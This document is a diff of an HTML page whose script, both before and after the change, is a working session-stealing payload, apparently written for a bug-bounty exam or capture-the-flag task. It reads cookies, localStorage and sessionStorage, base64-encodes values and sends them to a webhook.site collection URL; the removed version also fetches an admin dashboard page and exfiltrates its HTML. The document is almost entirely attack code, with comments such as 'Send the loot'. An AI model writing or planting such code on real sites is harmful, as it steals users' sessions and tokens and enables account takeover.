@@ -1,34 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        
-        // 1. Collect all possible session storage methods
-        const sessionData = {
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage)
-        };
+   <script>
+    const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
+    
+    // 1. Try to grab the Token from LocalStorage (Most likely for this exam)
+    // We search for common keys like 'token', 'accessToken', or 'auth'
+    for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        let value = localStorage.getItem(key);
+        fetch(webhook + "?key=" + key + "&value=" + btoa(value));
+    }
 
-        // 2. Send the loot to your webhook
-        fetch(webhook, {
-            method: "POST",
-            mode: "no-cors",
-            body: "SESSION_STOLEN: " + JSON.stringify(sessionData)
-        });
+    // 2. Try to grab Cookies
+    if (document.cookie) {
+        fetch(webhook + "?cookies=" + btoa(document.cookie));
+    }
 
-        // 3. Try to fetch the Admin Dashboard HTML directly 
-        // Sometimes the Flag is just hidden in the page source!
-        fetch("https://bugbounty-exam.hashacademy.co/admin/dashboard")
-            .then(r => r.text())
-            .then(html => {
-                fetch(webhook, {
-                    method: "POST",
-                    mode: "no-cors",
-                    body: "DASHBOARD_SOURCE: " + html
-                });
-            });
-    </script>
+    // 3. Heartbeat - Just to confirm the bot is still alive
+    fetch(webhook + "?status=alive_and_running");
+</script>
 </body>
 </html>
